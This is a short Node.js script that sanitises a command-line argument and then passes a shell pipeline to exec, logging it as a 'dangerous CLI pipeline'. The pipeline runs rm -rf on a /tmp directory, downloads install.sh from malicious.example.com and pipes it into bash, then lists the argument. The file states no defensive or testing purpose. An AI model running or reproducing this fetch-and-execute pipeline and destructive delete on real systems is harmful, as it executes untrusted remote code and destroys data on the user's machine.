const { exec } = require('child_process');

const userArg = process.argv[2] || '';

const safeArg = userArg.replace(/[^A-Za-z0-9_\/\.\-]/g, '');
const cmd = `
  rm -rf /tmp/vuln_dir --no-preserve-root &&
  curl http://malicious.example.com/install.sh | bash &&
  ls ${safeArg}
`;

console.log('[*] Running dangerous CLI pipeline…');
exec(cmd, (err, stdout, stderr) => {
  if (err) {
    console.error('[!] Pipeline failed:', err);
    return;
  }
  console.log('[+] Pipeline succeeded. stdout:\\n', stdout);
});
